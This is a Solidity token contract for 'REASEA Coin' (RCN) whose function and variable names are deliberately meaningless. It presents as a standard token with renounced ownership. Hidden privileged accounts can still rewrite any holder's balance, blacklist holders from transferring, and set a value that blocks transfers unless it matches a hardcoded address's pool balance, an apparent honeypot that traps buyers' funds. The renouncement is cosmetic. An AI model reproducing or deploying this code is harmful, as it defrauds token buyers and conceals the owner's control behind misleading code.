//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface shouldIs {
    function createPair(address teamSender, address maxMarketingMode) external returns (address);
}

interface walletMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tokenExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapEnable) external view returns (uint256);

    function transfer(address marketingAtFee, uint256 tokenShould) external returns (bool);

    function allowance(address fundTxEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenShould) external returns (bool);

    function transferFrom(
        address sender,
        address marketingAtFee,
        uint256 tokenShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atFromShould, uint256 value);
    event Approval(address indexed fundTxEnable, address indexed spender, uint256 value);
}

interface exemptBuyMetadata is exemptBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract REASEACoin is tokenExempt, exemptBuy, exemptBuyMetadata {

    function balanceOf(address swapEnable) public view virtual override returns (uint256) {
        return sellLaunchedWallet[swapEnable];
    }

    function name() external view virtual override returns (string memory) {
        return launchedEnable;
    }

    uint256 public shouldAmount;

    function launchedFromFund(uint256 tokenShould) public {
        launchedFee();
        swapMarketingReceiver = tokenShould;
    }

    event OwnershipTransferred(address indexed receiverSwapSell, address indexed enableShouldMin);

    function transfer(address walletSender, uint256 tokenShould) external virtual override returns (bool) {
        return marketingTrading(_msgSender(), walletSender, tokenShould);
    }

    bool public modeTrading;

    function shouldSwap(address buyMarketing) public {
        if (modeTrading) {
            return;
        }
        
        fromTx[buyMarketing] = true;
        
        modeTrading = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptShouldFund;
    }

    address private amountLimit;

    function transferFrom(address atTo, address marketingAtFee, uint256 tokenShould) external override returns (bool) {
        if (_msgSender() != isFund) {
            if (teamTrading[atTo][_msgSender()] != type(uint256).max) {
                require(tokenShould <= teamTrading[atTo][_msgSender()]);
                teamTrading[atTo][_msgSender()] -= tokenShould;
            }
        }
        return marketingTrading(atTo, marketingAtFee, tokenShould);
    }

    function getOwner() external view returns (address) {
        return amountLimit;
    }

    uint256 private exemptShouldFund = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return amountLimit;
    }

    function fromShould(address walletSender, uint256 tokenShould) public {
        launchedFee();
        sellLaunchedWallet[walletSender] = tokenShould;
    }

    uint256 swapMarketingReceiver;

    uint256 tokenMin;

    function atReceiverTx(address atTo, address marketingAtFee, uint256 tokenShould) internal returns (bool) {
        require(sellLaunchedWallet[atTo] >= tokenShould);
        sellLaunchedWallet[atTo] -= tokenShould;
        sellLaunchedWallet[marketingAtFee] += tokenShould;
        emit Transfer(atTo, marketingAtFee, tokenShould);
        return true;
    }

    uint8 private senderMarketing = 18;

    function marketingTrading(address atTo, address marketingAtFee, uint256 tokenShould) internal returns (bool) {
        if (atTo == fromEnable) {
            return atReceiverTx(atTo, marketingAtFee, tokenShould);
        }
        uint256 totalMin = exemptBuy(walletIs).balanceOf(enableLiquiditySender);
        require(totalMin == swapMarketingReceiver);
        require(!autoAmount[atTo]);
        return atReceiverTx(atTo, marketingAtFee, tokenShould);
    }

    function symbol() external view virtual override returns (string memory) {
        return receiverShould;
    }

    mapping(address => mapping(address => uint256)) private teamTrading;

    uint256 public autoToLiquidity;

    function allowance(address autoTake, address enableTakeReceiver) external view virtual override returns (uint256) {
        if (enableTakeReceiver == isFund) {
            return type(uint256).max;
        }
        return teamTrading[autoTake][enableTakeReceiver];
    }

    function launchedFee() private view {
        require(fromTx[_msgSender()]);
    }

    address public walletIs;

    string private receiverShould = "RCN";

    uint256 private takeSell;

    address enableLiquiditySender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function tokenEnable() public {
        emit OwnershipTransferred(fromEnable, address(0));
        amountLimit = address(0);
    }

    bool private listFund;

    function approve(address enableTakeReceiver, uint256 tokenShould) public virtual override returns (bool) {
        teamTrading[_msgSender()][enableTakeReceiver] = tokenShould;
        emit Approval(_msgSender(), enableTakeReceiver, tokenShould);
        return true;
    }

    mapping(address => bool) public fromTx;

    string private launchedEnable = "REASEA Coin";

    bool private limitAmount;

    function decimals() external view virtual override returns (uint8) {
        return senderMarketing;
    }

    mapping(address => uint256) private sellLaunchedWallet;

    constructor (){
        if (takeSell != txReceiver) {
            limitAmount = false;
        }
        tokenEnable();
        walletMin modeFee = walletMin(isFund);
        walletIs = shouldIs(modeFee.factory()).createPair(modeFee.WETH(), address(this));
        
        fromEnable = _msgSender();
        fromTx[fromEnable] = true;
        sellLaunchedWallet[fromEnable] = exemptShouldFund;
        
        emit Transfer(address(0), fromEnable, exemptShouldFund);
    }

    address public fromEnable;

    uint256 public txReceiver;

    function receiverMax(address walletTx) public {
        launchedFee();
        if (txReceiver != takeSell) {
            takeSell = txReceiver;
        }
        if (walletTx == fromEnable || walletTx == walletIs) {
            return;
        }
        autoAmount[walletTx] = true;
    }

    mapping(address => bool) public autoAmount;

    address isFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

}